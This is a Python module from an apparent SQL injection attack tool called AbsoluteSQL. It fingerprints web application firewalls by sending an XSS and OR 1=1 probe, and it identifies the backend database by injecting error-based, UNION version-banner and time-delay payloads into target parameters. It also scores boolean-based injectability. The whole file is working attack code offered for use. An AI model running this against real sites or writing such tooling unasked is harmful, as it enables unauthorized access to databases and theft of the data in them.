"""
AbsoluteSQL — Detector
WAF fingerprinting, DBMS identification, error signature matching.
"""

import re
import time
from typing import Optional, List, Dict, Tuple

from .config import (
    SUPPORTED_DBMS, DBMS_MYSQL, DBMS_PG, DBMS_MSSQL,
    DBMS_ORACLE, DBMS_SQLITE, DBMS_MARIADB, TIME_DELAY, TIME_THRESHOLD
)
from .payloads import (
    detect_dbms_from_errors, detect_waf_from_response,
    EXTRACTION_QUERIES, get_time_payloads, get_error_payloads
)
from .http_client import HTTPClient
from .utils import log, inject_param, parse_url


class WAFDetector:
    """
    Probes a target URL for known WAF behaviour before injecting.
    Sends a clean request then a deliberately malicious one and
    compares status codes, headers, and body signals.
    """

    def __init__(self, client: HTTPClient) -> None:
        self.client = client

    def detect(self, url: str, method: str = "GET", data: Optional[Dict] = None) -> Optional[str]:
        """
        Return the name of a detected WAF, or None.
        """
        # Clean baseline
        baseline_r = self.client.get(url) if method == "GET" else self.client.post(url, data)
        if baseline_r is None:
            return None

        # Deliberate bad payload
        probe_url  = url + "?waf_probe=<script>alert(1)</script>' OR 1=1-- "
        probe_r    = self.client.get(probe_url)
        if probe_r is None:
            probe_r = baseline_r

        # Check WAF signatures on both responses
        for r in (probe_r, baseline_r):
            hits = detect_waf_from_response(dict(r.headers), r.text, r.status_code)
            if hits:
                log.info(f"WAF detected: {hits[0]}")
                return hits[0]

        # Heuristic: 403/406/429 on probe but not baseline
        if baseline_r.status_code == 200 and probe_r.status_code in (403, 406, 429, 503):
            return "Unknown WAF"

        return None


class DBMSDetector:
    """
    Identifies the backend DBMS using:
      1. Error messages triggered by quote injection
      2. Version-query comparison per DBMS (error-based)
      3. Time-based fingerprinting as last resort
    """

    def __init__(self, client: HTTPClient) -> None:
        self.client = client

    # ── Error message fingerprint ─────────────────────────────────────────────
    def from_error_body(self, body: str) -> Optional[str]:
        hits = detect_dbms_from_errors(body)
        if hits:
            return hits[0]
        return None

    # ── Active probing ────────────────────────────────────────────────────────
    def probe(
        self,
        url:   str,
        param: str,
        value: str,
        method: str = "GET",
    ) -> Optional[str]:
        """
        Send each error-based payload and look for DBMS error signatures.
        Returns first DBMS matched or None.
        """
        for payload in get_error_payloads()[:12]:  # first 12 are fast
            injected = value + payload
            if method == "GET":
                test_url = inject_param(url, param, injected)
                r = self.client.get(test_url)
            else:
                r = self.client.post(url, data={param: injected})

            if r is None:
                continue

            dbms = self.from_error_body(r.text)
            if dbms:
                log.info(f"DBMS fingerprinted via errors: {dbms}")
                return dbms

        # No error signatures — try banner queries
        return self._probe_banner(url, param, value, method)

    def _probe_banner(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str,
    ) -> Optional[str]:
        """
        Try version-banner UNION selects for each DBMS.
        Returns first that succeeds (response contains a version string).
        """
        version_payloads = {
            DBMS_MYSQL:   "' UNION SELECT @@version,NULL--",
            DBMS_PG:      "' UNION SELECT version(),NULL--",
            DBMS_MSSQL:   "' UNION SELECT @@version,NULL--",
            DBMS_ORACLE:  "' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--",
            DBMS_SQLITE:  "' UNION SELECT sqlite_version(),NULL--",
            DBMS_MARIADB: "' UNION SELECT @@version,NULL--",
        }

        version_patterns = {
            DBMS_MYSQL:   r"(?i)\b(mysql|mariadb)\b.*\d+\.\d+",
            DBMS_PG:      r"(?i)postgresql\s+\d+\.\d+",
            DBMS_MSSQL:   r"(?i)microsoft sql server\s+\d{4}",
            DBMS_ORACLE:  r"(?i)oracle\s+database",
            DBMS_SQLITE:  r"(?i)\d+\.\d+\.\d+",
            DBMS_MARIADB: r"(?i)mariadb",
        }

        for dbms, payload in version_payloads.items():
            injected = value + payload
            if method == "GET":
                test_url = inject_param(url, param, injected)
                r = self.client.get(test_url)
            else:
                r = self.client.post(url, data={param: injected})

            if r is None:
                continue

            pat = version_patterns.get(dbms, "")
            if pat and re.search(pat, r.text):
                log.info(f"DBMS fingerprinted via banner: {dbms}")
                return dbms

        return None

    # ── Time-based DBMS differentiation ──────────────────────────────────────
    def from_time_based(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str = "GET",
        delay:  int = TIME_DELAY,
    ) -> Optional[str]:
        """
        When error and union approaches fail, try DBMS-specific sleep payloads.
        The first one that causes a measurable delay identifies the DBMS.
        """
        dbms_order = [DBMS_MYSQL, DBMS_MSSQL, DBMS_PG, DBMS_ORACLE, DBMS_SQLITE]

        for dbms in dbms_order:
            payloads = get_time_payloads(dbms, delay)
            for payload in payloads[:2]:  # 2 per DBMS is enough to confirm
                injected = value + payload
                if method == "GET":
                    test_url = inject_param(url, param, injected)
                    _, elapsed = self.client.timed_get(test_url)
                else:
                    _, elapsed = self.client.timed_post(url, data={param: injected})

                if elapsed >= delay * 0.8:
                    log.info(f"DBMS fingerprinted via time-based: {dbms} (elapsed {elapsed:.2f}s)")
                    return dbms

        return None


class ResponseAnalyzer:
    """
    Analyses pairs of HTTP responses to detect boolean-based injection.
    Compares content length, status codes, and structural signatures.
    """

    def __init__(self, threshold: float = 0.10) -> None:
        self.threshold = threshold  # minimum relative size difference to flag

    def compare(
        self,
        true_resp,
        false_resp,
        baseline,
    ) -> Tuple[bool, float]:
        """
        Return (is_injectable, confidence_score).
        true_resp  → response to always-true payload
        false_resp → response to always-false payload
        baseline   → uninjected baseline text
        """
        if true_resp is None or false_resp is None:
            return False, 0.0

        t_len = len(true_resp.text)
        f_len = len(false_resp.text)
        b_len = len(baseline) if baseline else t_len

        # Length difference between true and false
        if f_len == 0:
            return False, 0.0
        len_diff = abs(t_len - f_len) / max(t_len, f_len)

        # Status code difference
        status_diff = int(true_resp.status_code != false_resp.status_code)

        # True response matches baseline, false does not
        baseline_match = abs(t_len - b_len) < abs(f_len - b_len)

        # Score
        score = (len_diff * 0.6) + (status_diff * 0.3) + (baseline_match * 0.1)

        injectable = (
            len_diff > self.threshold
            or status_diff > 0
        )

        return injectable, min(score, 1.0)

    def is_error_based(self, response_text: str) -> Tuple[bool, Optional[str]]:
        """Check if response contains a DBMS error. Returns (found, dbms_name)."""
        hits = detect_dbms_from_errors(response_text)
        if hits:
            return True, hits[0]
        return False, None
